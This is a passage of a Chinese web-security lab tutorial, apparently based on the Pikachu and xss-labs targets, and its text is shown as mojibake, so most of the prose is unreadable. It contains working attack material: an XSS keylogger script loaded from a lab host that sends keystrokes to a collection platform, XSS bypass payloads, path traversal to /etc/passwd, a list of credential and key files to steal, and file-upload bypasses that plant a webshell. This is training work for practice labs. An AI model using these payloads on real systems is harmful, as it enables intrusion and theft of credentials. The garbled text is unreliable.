æ¯”å¦‚ä¸€ä¸ªæ¶æ„ç½‘ç«™çš„é¡µé¢é€šè¿‡jsåµŒå…¥äº†é“¶è¡Œçš„ç™»å½•é¡µé¢ï¼ˆäºŒè€…ä¸åŒæºï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´æ¶æ„çš„è¯·æ±‚äº†å…¶ä»–ç½‘ç«™çš„é¡µé¢æˆ–è€…æ•°æ®ï¼Œæ‹¿åˆ°è‡ªå·±çš„é¡µé¢ä¸Šä½¿ç”¨ï¼Œå¦‚æœæ²¡æœ‰åŒæºé™åˆ¶ï¼Œæ¶æ„ç½‘é¡µä¸Šçš„javascriptè„šæœ¬å°±å¯ä»¥åœ¨ç”¨æˆ·ç™»å½•é“¶è¡Œçš„æ—¶å€™è·å–ç”¨æˆ·åå’Œå¯†ç ã€‚ Tips:ä¸‹é¢è¿™äº›æ ‡ç­¾è·¨åŸŸåŠ è½½èµ„æºæ˜¯ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„ï¼Œ(ä½†æ˜¯èµ„æºç±»å‹æ˜¯æœ‰é™åˆ¶çš„)script src=... //åŠ è½½jsæ‰§è¡Œimg src=... //å›¾ç‰‡link href=... //cssiframe src=... //ä»»æ„èµ„æºa href=... // è¶…é“¾æ¥åœ°å€ (3)ã€åŒæºç­–ç•¥ä¿®æ”¹D:\\phpStudy\\WWW\\pikachu\\pkxss\\rkeypress\\rkserver.php åŒä¹‹å‰çš„æ¡ˆä¾‹åˆ°åå°è®¾ç½®å¥½Access-Control-Allow-Originï¼Œè®¾ç½®ä¸º*ï¼Œæ—¢å…è®¸æ‰€æœ‰äººè®¿é—®ã€‚ä¸€èˆ¬å…¬å¸çš„ç½‘ç«™åå°éƒ½ä¸ä¼šè®¾ç½®*å·çš„ã€‚(4ï¼‰rk.jså…³é”®ä»£ç è§£è¯»var realkey = String.fromCharCode(event.keyCode); //è·å–ç”¨æˆ·é”®ç›˜è®°å½•ï¼Œæœ€åè½¬åŒ–ä¸ºå­—ç¬¦ä¸²xl+=realkey; //èµ‹å€¼ç»™x1show(); //è°ƒç”¨showæ¶µæ•°ï¼Œé€šè¿‡ä¸‹é¢ajaxè¿›è¡Œpostå‘é€é”®ç›˜è®°å½•äººå†…å®¹è¾“å…¥è®¾ç½®å¥½çš„æ¶æ„JSä»£ç ï¼šscript src=http://192.168.0.15/pikachu/pkxss/rkeypress/rk.js/scriptç„¶ååœ¨é”®ç›˜ä¸Šéšæ„è¾“å…¥ï¼Œå°±å¯ä»¥åˆ°xsså¹³å°ä¸Šå»æŸ¥çœ‹é”®ç›˜è¾“å…¥çš„ç»“æœ è·¨åŸŸæŠ¥é”™ï¼š æˆ–è€…è¿™é‡Œï¼š corsè·¨åŸŸ jsonpè·¨åŸŸ htmlhead/headbody buttongo/button/body!-- é¡µé¢ä¼šæç¤ºåŒæºæœºåˆ¶çš„æŠ¥é”™ script src=https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.js/script script $.ajax( type:get, url:http://192.168.2.106/pikachu/pkxss/rkeypress/test.php, dataType:jsonp, success:function(res) console.log(res); ) /script--script document.querySelector(button).onclick = function() var sc = document.createElement(script); sc.src=http://192.168.2.106/pikachu/pkxss/rkeypress/test.php?cb=fn; document.body.append(sc); function fn(data) console.log(data); /script/html test.php ?php $fn = $_GET[cb]; echo $fn.(username=jadenpassword=666); ? æ€»ç»“ jsonpè·¨åŸŸï¼š é¦–å…ˆå£°æ˜ä¸€ä¸ªjså‡½æ•°ï¼Œè¿™æ˜¯æˆ‘ä»¬çš„å›è°ƒå‡½æ•°ï¼Œæ¯”å¦‚å‡½æ•°åç§°ä¸ºjadenï¼Œå†åŸºäºscriptæ ‡ç­¾çš„srcå±æ€§çš„è·¨åŸŸç‰¹æ€§æ¥å‘é€ç½‘ç»œè¯·æ±‚ï¼Œæºå¸¦ä¸€ä¸ªå›è°ƒå‡½æ•°å‚æ•°ï¼Œå‡½æ•°åç§°ä¸ºæˆ‘ä»¬å£°æ˜çš„jadenï¼ŒæœåŠ¡ç«¯å“åº”å›äº†jaden(â€˜æ•°æ®â€™)ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‡ªå·±å£°æ˜çš„jadenå‡½æ•°å°±æ‹¿åˆ°äº†æœåŠ¡ç«¯çš„å“åº”æ•°æ®ã€‚ 9-3-6 20å…³ç»ƒä¹ 6-1 ç¬¬ä¸€å…³æ²¡æœ‰ä»»ä½•é˜²èŒƒ scriptalert(jaden);/script 6-2 ç¬¬äºŒå…³å¯ä»¥çœ‹åˆ°åœ¨ æ ‡ç­¾è¿™é‡Œä»–å°† å’Œ è¿›è¡Œäº†ç¼–ç ï¼Œè€Œåœ¨è¾“å…¥ è¿™ä¸ªæ ‡ç­¾ä¸­ï¼Œä»–æ˜¯æ²¡æœ‰è¢«ç¼–ç çš„ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„æ³¨å…¥è¯­å¥è¢«æ”¾åˆ°äº†value å€¼å½“ä¸­ï¼Œè¿™æ ·æµè§ˆå™¨æ˜¯ä¸ä¼šæ‰§è¡Œæˆ‘ä»¬çš„æ³¨å…¥è¯­å¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ„é€ é—­åˆ â€˜â€œ å¥½ï¼Œé‚£æˆ‘ä»¬æ¢æ ‡ç­¾ï¼Œæ¯”å¦‚imgæ ‡ç­¾ http://192.168.2.106/xss-labs/level1.php?name=jaden![](1) æ³¨æ„ä¸è¦è®©src#ï¼Œ#ä¼šå½±å“è¾“å…¥ï¼Œæœ‰æ³¨é‡Šçš„æ•ˆæœï¼Œè€Œä¸”imgæ ‡ç­¾çš„åé¢ç»“å°¾å¤„æŠŠåˆ é™¤ï¼Œä¹Ÿå°±æ˜¯æŠŠåˆ é™¤ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç½‘å€å¤–å±‚è¦åŠ ä¸Šå•å¼•å·ï¼Œå¦‚ä¸‹ http://192.168.2.106/xss-labs/level15.php?src=http://192.168.2.106/xss\u0002labs/level1.php?name=jaden![](1)â€˜ 6-15 ç¬¬åå…­å…³æ­£å¸¸æµ‹è¯• å‘ç°ç©ºæ ¼è¢«å®ä½“ç¼–ç äº† å°è¯•ç”¨æ¢è¡Œæ›¿æ¢ç©ºæ ¼çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œå¯ä»¥å…ˆå°†æ¢è¡Œè¿›è¡Œurlç¼–ç  %0D%0A ï¼Œå› ä¸ºåœ¨htmlä¸­æ¢è¡Œå’Œå¤šä¸ªç©ºæ ¼éƒ½æ˜¯æŒ‰ç…§ä¸€ä¸ªç©ºæ ¼è¿›è¡Œå¤„ç†çš„ï¼Œç„¶åæµ‹è¯•ï¼š http://192.168.2.106/xss-labs/level16.php?keyword=%3Cimg%0D%0Asrc=1%0D%0Aonerror=alert(%22jaden%22)%3E 6-16 ç¬¬åä¸ƒå…³embedæ ‡ç­¾å¯ä»¥ç†è§£ä¸ºå®šä¹‰äº†ä¸€ä¸ªåŒºåŸŸï¼Œå¯ä»¥æ”¾å›¾ç‰‡ã€è§†é¢‘ã€éŸ³é¢‘ç­‰å†…å®¹ï¼Œä½†æ˜¯å‘¢ç›¸å¯¹äºä»–ä»¬ï¼Œembedæ ‡ç­¾æ‰“å¼€ä¸äº†æ–‡ä»¶çš„æ—¶å€™å°±ä¼šæœ‰å—é”™è¯¯çš„åŒºåŸŸã€‚ä¹Ÿå¯ä»¥ç»‘å®šå„ç§äº‹ä»¶ï¼Œæ¯”å¦‚å°è¯•ç»‘å®šä¸€ä¸ªonmouseoveräº‹ä»¶ã€‚åå°çœ‹ä»£ç ç”¨äº†htmlspecialcharsï¼Œæ‰€ä»¥ç›´æ¥å†™æ ‡ç­¾æ˜¯ä¸è¡Œçš„ã€‚embedæ ‡ç­¾åŸºæœ¬ä¸æ€ä¹ˆç”¨äº†ï¼Œæ‰€ä»¥è¿™ä¸€å…³å°±ç®€å•äº†è§£ä¸€ä¸‹å³å¯ã€‚ â€˜ onmouseoveralert(â€œainiâ€) 6-17 ç¬¬åå…«å…³j 9-3 ä»»æ„æ–‡ä»¶ä¸Šä¼ ä¸‹è½½9-3-1 ä»»æ„æ–‡ä»¶ä¸‹è½½1 -1 ç¤ºä¾‹ çœ‹ä¸€ä¸‹å›¾ç‰‡çš„ç½‘å€ ç½‘å€ï¼š http://192.168.0.15/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png çœ‹åˆ°è¿™æ ·çš„ç½‘å€ï¼Œæˆ‘ä»¬ä¸Šæ¥çš„ååº”æ˜¯sqlæ³¨å…¥ç‚¹ã€xssæ”»å‡»ç­‰æ‰‹æ®µï¼Œç°åœ¨è¿˜éœ€è¦è€ƒè™‘æœ‰æ²¡æœ‰ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œæ¯”å¦‚æ”¹ä¸€ä¸ªæ–‡ä»¶åä¼šæ€æ ·å‘¢ï¼Ÿä¼šä¸ä¼šä¸‹è½½è¿™ä¸ªæ–‡ä»¶åçš„æ–‡ä»¶å‘¢ï¼Ÿå…ˆçœ‹ä¸€ä¸‹æ–‡ä»¶æ‰€åœ¨ç›®å½• é‚£ä¹ˆç½‘å€è·¯å¾„å’Œç‰©ç†è·¯å¾„çš„å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼šä½†æ˜¯æ³¨æ„ï¼Œç‰©ç†è·¯å¾„çš„æœ€åä¸€ä¸ªdownloadæ–‡ä»¶å¤¹æ˜¯æ²¡æœ‰åœ¨ç½‘å€è·¯å¾„ä¸Šä½“ç°å‡ºæ¥çš„ï¼Œé€šè¿‡filenameå‚æ•°å¯¹åº”çš„æ–‡ä»¶åç§°ï¼Œåå°ä»£ç è‚¯å®šæ˜¯å»downloadæ–‡ä»¶å¤¹é‡Œé¢æ‰¾å¯¹åº”çš„æ–‡ä»¶äº† æˆ‘ä»¬å†æ¥çœ‹ï¼Œ ......index.php ï¼Œä»downloadæ–‡ä»¶å¤¹å¼€å§‹å¾€ä¸Šå±‚èµ°ï¼Œæ‰¾åˆ°äº†å¦‚ä¸‹pikachuæ–‡ä»¶å¤¹ï¼Œå°†é‡Œé¢çš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥äº†ã€‚ æ•ˆæœï¼šindex.phpè¢«ä¸‹è½½ä¸‹æ¥äº†ï¼Œè¿™å°±å«åšä»»æ„æ–‡ä»¶ä¸‹è½½ã€‚è¿™æ ·çš„æ¼æ´ç°åœ¨è¿˜æœ‰å¥½å¤šã€‚ 1-2 äº§ç”ŸåŸå›  å†™ä»£ç çš„æ—¶å€™ï¼Œä»£ç è§„å®šä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œåªèƒ½åœ¨æŸä¸ªæ–‡ä»¶å¤¹é‡Œé¢ä¸‹è½½æ–‡ä»¶ï¼Œè¿™æ ·å°±èƒ½é˜²æ­¢è¿™ä¸ªæ¼æ´ï¼Œä½†æ˜¯å¾ˆå¤šç¨‹åºå‘˜ä¸çŸ¥é“è¿™ä¸ªé—®é¢˜ï¼Œå¯¼è‡´äº†æ¼æ´ã€‚å¦ä¸€ä¸ªé˜²å¾¡æ–¹æ³•ï¼Œå°±æ˜¯å°† .. ä¹‹ç±»çš„ç¬¦å·å±è”½æˆ–è€…è¿‡æ»¤æ‰ã€‚ å¾ˆå¤šç½‘ç«™è¿˜ä¼šå‡ºå…ˆå¦‚ä¸‹çš„é—®é¢˜ï¼Œå°±æ˜¯å†™å¾ˆå¤šå¾ˆå¤šå±‚çš„ .. http://192.168.0.15/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../../../../../../../../../../../etc/passwd ## é€šè¿‡....ç­‰åˆ‡æ¢ç›®å½•ï¼Œä¹Ÿå«åšç›®å½•ç©¿è¶Šæ¼æ´ã€‚ å¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªå±‚çº§æ˜¯ä¸å­˜åœ¨çš„ï¼Œé‚£ä¹ˆå¦‚æœæ²¡æœ‰å¯¹è·¯å¾„è¿›è¡Œå¤„ç†çš„è¯ï¼Œå¾ˆæœ‰å¯èƒ½é»˜è®¤å°±ç›´æ¥è¿”å›äº†ç³»ç»Ÿæ ¹è·¯å¾„ï¼Œé‚£ä¹ˆå°±æ‹¿åˆ°äº†æ ¹è·¯å¾„ä¸‹é¢çš„etcä¸‹é¢çš„passwdæ–‡ä»¶ã€‚ 1-3 åˆ©ç”¨æ–¹å¼å¿«é€Ÿæ‰«æä¸‹è½½æ¼æ´çš„æ—¶å€™ï¼Œä¸ç®¡æ˜¯å·¥å…·è¿˜æ˜¯æ‰‹å·¥ï¼Œæˆ‘ä»¬æ€ä¹ˆåˆ¤æ–­ä¸‹è½½æ¼æ´å‘¢ï¼Ÿå®ƒæœ‰å‡ ä¸ªå…³é”®çš„å½¢å¼ï¼š ## ä¸€èˆ¬é“¾æ¥å½¢å¼: download.php?path down.php?file data.php?file download.php?filename ## æˆ–è€…åŒ…å«å‚æ•°: Src Inputfile Filepath Path Data 1-4 åˆ©ç”¨æ€è·¯å½“é‡åˆ°ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½æ—¶ï¼Œæˆ‘ä»¬çš„ä¸€èˆ¬åˆ©ç”¨æ€è·¯:æ¯”å¦‚ä¸‹è½½å“ªäº›æ–‡ä»¶å‘¢ï¼Ÿ (1)ä¸‹è½½å¸¸è§„çš„é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚: ssh,weblogic,ftp,mysqlç­‰ç›¸å…³é…ç½® (2)ä¸‹è½½å„ç§.logæ–‡ä»¶ï¼Œä»ä¸­å¯»æ‰¾ä¸€äº›åå°åœ°å€ï¼Œæ–‡ä»¶ä¸Šä¼ ç‚¹ä¹‹ç±»çš„åœ°æ–¹ï¼Œå¦‚æœè¿æ°”å¥½çš„è¯ä¼šè·å¾—ä¸€äº›å‰è¾ˆä»¬çš„åé—¨ã€‚ (3)ä¸‹è½½webä¸šåŠ¡æ–‡ä»¶è¿›è¡Œç™½ç›’å®¡è®¡ï¼Œåˆ©ç”¨æ¼æ´è¿›ä¸€æ­¥æ”»å…¥æœåŠ¡å™¨ã€‚å¦‚æœæ˜¯linuxç³»ç»Ÿçš„è¯ï¼Œå°è¯•è¯»å–root.bash_historyçœ‹è‡ªå·±æ˜¯å¦å…·æœ‰rootæƒé™ã€‚å¦‚æœæ²¡æœ‰çš„è¯ã€‚æˆ‘ä»¬åªèƒ½æŒ‰éƒ¨å°±ç­çš„åˆ©ç”¨..æ¥å›è·³è½¬è¯»å–ä¸€äº›.sshä¸‹çš„é…ç½®ä¿¡æ¯æ–‡ä»¶ï¼Œè¯»å–mysqlä¸‹çš„.bash_historyæ–‡ä»¶ã€‚æ¥æŸ¥çœ‹æ˜¯å¦è®°å½•äº†ä¸€äº›å¯ä»¥åˆ©ç”¨çš„ç›¸å…³ä¿¡æ¯ã€‚ç„¶åé€ä¸ªä¸‹è½½æˆ‘ä»¬éœ€è¦å®¡è®¡çš„ä»£ç æ–‡ä»¶ï¼Œä½†æ˜¯ä¸‹è½½çš„æ—¶å€™å˜å¾—å¾ˆç¹çï¼Œ æˆ‘ä»¬åªèƒ½å°è¯•å»çŒœè§£ç›®å½•ï¼Œç„¶åä¸‹è½½ä¸€äº›ä¸­é—´ä»¶çš„è®°å½•æ—¥å¿—è¿›è¡Œåˆ†æã€‚ å¦‚æœæˆ‘ä»¬é‡åˆ°çš„æ˜¯java+oracleç¯å¢ƒï¼Œå¯ä»¥å…ˆä¸‹è½½WEB-INFclassesapplicationContext.xml æ–‡ä»¶ï¼Œè¿™é‡Œé¢è®°è½½çš„æ˜¯webæœåŠ¡å™¨çš„ç›¸åº”é…ç½®ï¼Œç„¶åä¸‹è½½WEB-INFclassesxxxxxxccc.classå¯¹æ–‡ä»¶è¿›è¡Œåç¼–è¯‘ï¼Œç„¶åæœç´¢æ–‡ä»¶ä¸­çš„uploadå…³é”®å­—çœ‹æ˜¯å¦å­˜åœ¨ä¸€äº›apiæ¥å£ï¼Œå¦‚æœå­˜åœ¨çš„è¯æˆ‘ä»¬å¯ä»¥æœ¬åœ°æ„é€ ä¸Šä¼ é¡µé¢ç”¨apiæ¥å£å°†æˆ‘ä»¬çš„æ–‡ä»¶ä¼ è¾“è¿›æœåŠ¡å™¨ï¼Œå¦‚æœå…·æœ‰rootæƒé™ï¼Œåœ¨linuxä¸­æœ‰è¿™æ ·ä¸€ä¸ªå‘½ä»¤ locate æ˜¯ç”¨æ¥æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•çš„ï¼Œå®ƒä¸æœç´¢å…·ä½“ç›®å½•ï¼Œè€Œæ˜¯æœç´¢ä¸€ä¸ªæ•°æ®åº“varlibmlocatemlocate.dbã€‚è¿™ä¸ªæ•°æ®åº“ä¸­å«æœ‰æœ¬åœ°æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯ã€‚ Linuxç³»ç»Ÿè‡ªåŠ¨åˆ›å»ºè¿™ä¸ªæ•°æ®åº“ï¼Œå¹¶ä¸”æ¯å¤©è‡ªåŠ¨æ›´æ–°ä¸€æ¬¡ã€‚å½“æˆ‘ä»¬ä¸çŸ¥é“è·¯å¾„æ˜¯ä»€ä¹ˆçš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå¯ä»¥è¯´æ˜¯ä¸€ä¸ªæ ¸æ­¦å™¨äº†ï¼Œæˆ‘ä»¬åˆ©ç”¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´mlocate.dbæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œåˆ©ç”¨locateå‘½ä»¤å°†æ•°æ®è¾“å‡ºæˆæ–‡ä»¶ï¼Œè¿™é‡Œé¢åŒ…å«äº†å…¨éƒ¨çš„æ–‡ä»¶è·¯å¾„ä¿¡æ¯ã€‚ locate è¯»å–æ–¹æ³•: locate mlocate.db admin å¯ä»¥å°†mlocate.dbä¸­åŒ…å«adminæ–‡ä»¶åçš„å†…å®¹å…¨éƒ¨è¾“å‡ºæ¥ ï¼ˆ4ï¼‰å¸¸è§åˆ©ç”¨æ–‡ä»¶ root.sshauthorized_keys root.sshid_rsa root.sshid_ras.keystore root.sshknown_hosts è®°å½•æ¯ä¸ªè®¿é—®è®¡ç®—æœºç”¨æˆ·çš„å…¬é’¥ etcpasswd å­˜ç”¨æˆ·åçš„ *** etcshadow å­˜å¯†ç çš„ *** etcmy.cnf mysqlé…ç½®æ–‡ä»¶ *** etchttpdconfhttpd.conf apacheé…ç½®æ–‡ä»¶ *** root.bash_history ç”¨æˆ·å†å²å‘½ä»¤è®°å½•æ–‡ä»¶ root.mysql_history mysqlå†å²å‘½ä»¤è®°å½•æ–‡ä»¶ procmounts è®°å½•ç³»ç»ŸæŒ‚è½½è®¾å¤‡ porcconfig.gz å†…æ ¸é…ç½®æ–‡ä»¶ varlibmlocatemlocate.db å…¨æ–‡ä»¶è·¯å¾„ porcselfcmdline å½“å‰è¿›ç¨‹çš„cmdlineå‚æ•° 1-5 æ¼æ´ä¿®å¤ï¼ˆ1ï¼‰è¿‡æ»¤â€.â€ï¼Œä½¿ç”¨æˆ·åœ¨urlä¸­ä¸èƒ½å›æº¯ä¸Šçº§ç›®å½• ä¸èƒ½ç›®å½•ç©¿è¶Š .... ï¼ˆ2ï¼‰æ­£åˆ™ä¸¥æ ¼åˆ¤æ–­ç”¨æˆ·è¾“å…¥å‚æ•°çš„æ ¼å¼ ï¼ˆ3ï¼‰php.inié…ç½®open_basediré™å®šæ–‡ä»¶è®¿é—®èŒƒå›´ 9-3-2 ä»»æ„æ–‡ä»¶ä¸Šä¼ 2-1 æµ‹è¯•æµç¨‹åªè¦çœ‹åˆ°æœ‰æ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹éƒ½å¯ä»¥è¿›è¡Œæµ‹è¯•ï¼Œéƒ½æœ‰å¯èƒ½å­˜åœ¨æ¼æ´ï¼Œå¾®ä¿¡ã€qqã€è®ºå›ç­‰ç­‰ï¼Œå¾®ä¿¡åˆšå¼€å§‹çš„æ—¶å€™å°±è¢«äººæè¿‡ä¸€æ¬¡ã€‚ 2-2 é˜²å¾¡æ‰‹æ®µ 2-3 å®æˆ˜æµ‹è¯•3-1 å‰ç«¯sæ ¡éªŒç»•è¿‡1-1 æ–¹å¼ä¸€å¦‚ä¸‹ä¸Šä¼ æ–‡ä»¶æ˜¯æœ‰æ ¼å¼è¦æ±‚çš„ï¼Œåªèƒ½ä¼ å›¾ç‰‡ æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªéå›¾ç‰‡æ–‡ä»¶æ¥çœ‹çœ‹æ•ˆæœ å‘ç°åªè¦ä¸æ˜¯å›¾ç‰‡æ ¼å¼çš„æ–‡ä»¶ï¼Œå°±ä¼šæŠ¥é”™ï¼Œé‚£è¿™ä¸ªé”™è¯¯å“ªæ¥çš„å‘¢ï¼Ÿæ‰¾åˆ°è¿™ä¸ªæºä»£ç ä½ç½®ï¼š è¿™æ˜¯ä¸ªå…¸å‹çš„å‰ç«¯jsæ ¡éªŒï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰¾åˆ°ç½‘ç«™æºä»£ç ï¼Œç›´æ¥åœ¨æµè§ˆå™¨ä¸Šä¿®æ”¹ä¸€ä¸‹ ç„¶åä¸Šä¼ ä¸€ä¸ªéå›¾ç‰‡æ–‡ä»¶æ¥çœ‹çœ‹æ•ˆæœï¼Œä¸‹é¢è¿™ä¸ªåŠ¨ä½œæˆ‘æ˜¯é€šè¿‡ç«ç‹æ¥æµ‹è¯•çš„ï¼Œå› ä¸ºè°·æ­Œæµè§ˆå™¨å¥½åƒä¸å¤ªè¡Œï¼Œç›´æ¥å°†é‚£ä¸ªonchangeå‡½æ•°åˆ æ‰äº† ç„¶åå‘ç°xx.txtæ–‡ä»¶ä¸Šä¼ æ²¡é—®é¢˜äº†ã€‚ç„¶åæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬ä¸Šå»ï¼Œæ‰¾åˆ°æœ¨é©¬æ–‡ä»¶æ‰€åœ¨ä½ç½® è¿”å›ç«ç‹æµè§ˆå™¨ï¼Œä¸Šä¼ è¿™ä¸ªæ–‡ä»¶ ä¸Šä¼ æˆåŠŸäº†ï¼Œå¹¶ä¸”æç¤ºä½ äº†æ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼Œæˆ‘ä»¬ç›´æ¥é€šè¿‡æµè§ˆå™¨æ¥è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œç½‘å€æ˜¯ http://192.168.0.15/pikachu/vul/unsafeupload/uploads/webshell.php æ•ˆæœï¼šå¯†ç å°±æ˜¯åˆšæ‰nodepad++æ‰“å¼€çš„wenshell.phpæ–‡ä»¶é‡Œé¢æ˜¾ç¤ºçš„å¯†ç  è·å–åˆ°äº†webshellå¯¹ç³»ç»Ÿè¿›è¡Œæ§åˆ¶ã€‚ å…¶å®å‰ç«¯jsæ ¡éªŒç»•è¿‡çš„è¯ï¼Œè¿˜å¯ä»¥é€šè¿‡burpæŠ“åŒ…ï¼Œä¿®æ”¹åŒ…çš„å½¢å¼è¿›è¡Œç»•è¿‡ 1-2 æ–¹å¼äºŒ1.å…ˆå°†webshell.phpæ”¹ä¸€ä¸‹æ‰©å±•åï¼Œæ¯”å¦‚å«åšwebshell.jpgï¼Œä¸ºäº†èƒ½å¤Ÿä¸Šä¼ æ˜‚ï¼Œè¿™é‡Œæˆ‘å¤åˆ¶äº†ä¸€ä»½ 2.pikachuä¸­ä¸Šä¼ ä¸€ä¸ªwebshell.jpgå›¾ç‰‡ï¼Œç„¶åæŠ“åŒ…ï¼Œçœ‹æ•ˆæœï¼Œä¸‹é¢è¿™ä¸ªå›¾ç‰‡æ˜¯æˆ‘ä¹‹å‰æçš„äº†ï¼Œä¹‹å‰æˆ‘çš„webshell.jpgï¼Œæˆ‘æ”¹åä¸ºäº†123.jpg 3.æŠ“åˆ°äº†è¿™ä¸ªå¼€å§‹ä¸Šä¼ çš„è¯·æ±‚æ—¶ï¼Œå…¶å®å‰ç«¯jsä»£ç å¯¹äºæ–‡ä»¶æ ¼å¼çš„æ‹¦æˆªå·²ç»ç»“æŸäº†ï¼Œæˆ‘ä»¬æŠ“åˆ°çš„å°±æ˜¯ä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚åŒ…äº†ï¼Œç„¶åå°†æ–‡ä»¶åç§°æ”¹ä¸ºwebshell.phpï¼Œç„¶åæ”¾åŒ…ï¼Œå°±ä¸Šä¼ æˆåŠŸäº†ã€‚ 3-2 æœåŠ¡ç«¯æ ¡éªŒç»•è¿‡2-1 MIMEç±»å‹æ£€æŸ¥æ¯ä¸ªMIMEç±»å‹ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå‰é¢æ˜¯æ•°æ®çš„å¤§ç±»åˆ«ï¼Œä¾‹å¦‚å£°éŸ³audioã€å›¾è±¡imageç­‰ï¼Œåé¢å®šä¹‰å…·ä½“çš„ç§ç±»ã€‚ å¸¸è§çš„MIMEç±»å‹(é€šç”¨å‹)ï¼š è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ .html texthtml xmlæ–‡æ¡£ .xml textxml XHTMLæ–‡æ¡£ .xhtml applicationxhtml+xml æ™®é€šæ–‡æœ¬ .txt textplain RTFæ–‡æœ¬ .rtf applicationrtf PDFæ–‡æ¡£ .pdf applicationpdf Microsoft Wordæ–‡ä»¶ .word applicationmsword PNGå›¾åƒ .png imagepng GIFå›¾å½¢ .gif imagegif JPEGå›¾å½¢ .jpeg,.jpg imagejpeg auå£°éŸ³æ–‡ä»¶ .au audiobasic MIDIéŸ³ä¹æ–‡ä»¶ mid,.midi audiomidi,audiox-midi RealAudioéŸ³ä¹æ–‡ä»¶ .ra, .ram audiox-pn-realaudio MPEGæ–‡ä»¶ .mpg,.mpeg videompeg AVIæ–‡ä»¶ .avi videox-msvideo GZIPæ–‡ä»¶ .gz applicationx-gzip TARæ–‡ä»¶ .tar applicationx-tar ä»»æ„çš„äºŒè¿›åˆ¶æ•°æ® applicationoctet-stream æˆ‘ä»¬éšä¾¿ä¸Šä¼ ä¸€ä¸ªéå›¾ç‰‡æ–‡ä»¶ï¼Œç„¶åç‚¹å‡»å¼€å§‹ä¸Šä¼ ï¼ŒæŠ“åˆ°è¿™ä¸ªåŒ…ï¼Œæ”¾åˆ°é‡å‘å™¨ï¼Œç„¶åå‘é€è¿™ä¸ªåŒ…ï¼Œçœ‹å“åº”ç»“æœï¼Œå‘ç°æŠ¥é”™äº† å…¶å®æˆ‘ä»¬çœ‹ä»£ç ï¼Œå°±ä¼šå‘ç°ï¼Œå®ƒæ˜¯é€šè¿‡Content-Typeè¿™ä¸ªè¯·æ±‚åˆ†æ®µæ•°æ®éƒ¨åˆ†çš„è¯·æ±‚å¤´ä¿¡æ¯æ¥è¿›è¡Œæ–‡ä»¶ç±»å‹åˆ¤æ–­çš„ï¼Œè¿™ä¸ªè¯·æ±‚å¤´çš„å€¼æ˜¯å›ºå®šçš„ï¼Œæ ¹æ®ä½ ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ï¼Œè‡ªåŠ¨æ·»åŠ çš„è¯·æ±‚å¤´çš„å€¼ã€‚çœ‹ä»£ç èƒ½çœ‹åˆ°ï¼Œå®ƒåªæ”¯æŒå›¾ç‰‡æ ¼å¼ã€‚ æ¥ä¸‹æ¥è¿›è¡Œç»•è¿‡ï¼Œå…¶å®å°±ä¿®æ”¹ä¸€ä¸‹è¿™ä¸ªè¯·æ±‚å¤´çš„å€¼å³å¯ï¼Œæ”¹ä¸ºï¼š imagepng ä¸Šä¼ æ–‡ä»¶ç®€å•åˆ†æ ## é€šè¿‡ä½¿ç”¨ PHP çš„å…¨å±€æ•°ç»„ $_FILESï¼Œä½ å¯ä»¥ä»å®¢æˆ·è®¡ç®—æœºå‘è¿œç¨‹æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶ã€‚ ## ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¡¨å•çš„ input nameï¼Œç¬¬äºŒä¸ªä¸‹æ ‡å¯ä»¥æ˜¯ â€œnameâ€, â€œtypeâ€, â€œsizeâ€, â€œtmp_nameâ€ æˆ–â€errorâ€ã€‚å°±åƒè¿™æ ·ï¼š $_FILES[â€œfileâ€][â€œnameâ€] - è¢«ä¸Šä¼ æ–‡ä»¶çš„åç§° $_FILES[â€œfileâ€][â€œtypeâ€] - è¢«ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ $_FILES[â€œfileâ€][â€œsizeâ€] - è¢«ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œä»¥å­—èŠ‚è®¡ $_FILES[â€œfileâ€][â€œtmp_nameâ€] - å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶çš„ä¸´æ—¶å‰¯æœ¬çš„åç§° $_FILES[â€œfileâ€][â€œerrorâ€] - ç”±æ–‡ä»¶ä¸Šä¼ å¯¼è‡´çš„é”™è¯¯ä»£ç  ## è¯¦ç»†å¯å‚è€ƒï¼šhttp://www.w3school.com.cn/php/php_file_upload.asp ## åˆ†æä»£ç é€»è¾‘ï¼šé¦–å…ˆä¼šè·å–åˆ°å‰ç«¯çš„æäº¤è¯·æ±‚ï¼Œç„¶åå®šä¹‰äº†ä¸€ä¸ªæ•°ç»„ï¼ˆå®šä¹‰å›¾ç‰‡ä¸Šä¼ æŒ‡å®šç±»å‹ï¼‰ï¼Œç„¶åé€šè¿‡upload_sickå‡½æ•°å¯¹ä¸Šä¼ 